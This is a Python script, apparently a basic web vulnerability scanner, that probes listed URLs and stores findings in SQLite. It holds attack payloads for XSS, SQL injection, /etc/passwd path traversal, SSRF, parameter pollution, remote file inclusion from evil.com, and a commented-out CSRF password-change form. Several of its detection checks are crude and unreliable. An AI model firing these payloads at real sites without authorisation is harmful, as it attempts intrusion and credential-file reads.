import requests        # Import the required lib
import urllib.parse    # Import the required lib
import sqlite3  # Import the SQLite library

# Connect to a SQLite database
conn = sqlite3.connect('vulnerabilities1.db')
c = conn.cursor()

# Create the database table if it doesn't exist
c.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
             (url TEXT, vulnerability TEXT)''')

#Here you can add multiple URLs to get scanned 

target_urls = [
    "Add URL",   # Add URL here inside " "
    "Add URL"   # Add URL here inside " "
    # "Add URL"    # Add URL here inside " "
]

# This for loop allows the prg to run each vulnerability test on the input URLs

for target_url in target_urls:
    try:
        response = requests.get(target_url)    # Sending a get request to the URL
        
        if response.status_code == 200:
            print("Website is accessible.")
            
            vulnerabilities = []    # List created to store the vulnerability for a particular URL
            
            # Check for XSS (with proper payload escaping)
            escaped_payload = urllib.parse.quote_plus("<script>alert('XSS Test')</script>")
            vulnerable_url = target_url + "/search?q=" + escaped_payload
            response = requests.get(vulnerable_url)

            if escaped_payload in response.text:
                print("Potential XSS vulnerability found!")

                vulnerabilities.append("XSS")   # Adds the vulnerability to the list 
            else:
                print("No XSS vulnerability detected.")
            
            # Check for SQL injection
            payload = "' OR 1=1 -- "  # A SQL statement
            vulnerable_url = target_url + "/login?username=" + payload + "&password=test"

            response = requests.get(vulnerable_url)

            if "Welcome" in response.text:
                print("Potential SQL injection vulnerability found!")

                vulnerabilities.append("SQL Injection")
            else:
                print("No SQL injection vulnerability detected.")
            
            # Check for Directory Traversal 
            payload = "../../../../../../etc/passwd"  # Attempt to access a sensitive file
            vulnerable_url = target_url + "/download?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "root:" in response.text:
                print("Potential directory traversal vulnerability found!")

                vulnerabilities.append("Directory Traversal")
            else:
                print("No directory traversal vulnerability detected.")
            
            # Check for CSRF (Cross-Site Request Forgery)
            # Requires crafting a CSRF exploit and checking if it's executed
            # Simulation of a CSRF attack with a simple form submission:
            
            # csrf_payload = "<form action='" + target_url + "/change_password' method='POST'>\n<input type='hidden' name='new_password' value='hacked'>\n<input type='submit' value='Submit'>\n</form>"
            
            # print("Potential CSRF vulnerability found! Try to exploit it with this payload:")
            # vulnerabilities.append("CSRF")
            # print(csrf_payload)
            
            # Check for SSRF (Server-Side Request Forgery )
            payload = "http://internal.example.com"  # Attempt to access an internal resource
            vulnerable_url = target_url + "/fetch_data?url=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Internal Server Error" in response.text:
                print("Potential SSRF vulnerability found!")

                vulnerabilities.append("SSRF")
            else:
                print("No SSRF vulnerability detected.")
            
            # Check for HPP (HTTP Parameter Pollution)
            payload = "?username=test&username=admin"  # Duplicate parameter with different values
            vulnerable_url = target_url + "/login" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Welcome, admin" in response.text:  # Check for unexpected behavior
                print("Potential HPP vulnerability found!")

                vulnerabilities.append("HPP")
            else:
                print("No HPP vulnerability detected.")
            
            # Check for RFI (Remote File Inclusion)
            payload = "http://evil.com/exploit.txt"  # Attempt to load a remote file
            vulnerable_url = target_url + "/include?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "Content of exploit.txt" in response.text:  # Check for successful inclusion
                print("Potential RFI vulnerability found!")

                vulnerabilities.append("RFI")
            else:
                print("No RFI vulnerability detected.")
            
            # Check for LFI (Local File Inclusion)
            payload = "../../../../../etc/passwd"  # Attempt to access a local file
            vulnerable_url = target_url + "/include?file=" + payload
            
            response = requests.get(vulnerable_url)
            
            if "root:" in response.text:  # Check for successful inclusion of sensitive file
                print("Potential LFI vulnerability found!")

                vulnerabilities.append("LFI")
            else:
                print("No LFI vulnerability detected.")
            
            # Now we add the list of vulnerabilities detected to the database with the corresponding URL
            for vulnerability in vulnerabilities:
                c.execute("INSERT INTO vulnerabilities VALUES (?, ?)", (target_url, vulnerability))
                conn.commit() 
        else:
            print("Website is not accessible. Status code:", response.status_code)

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

# Close the database
conn.close()
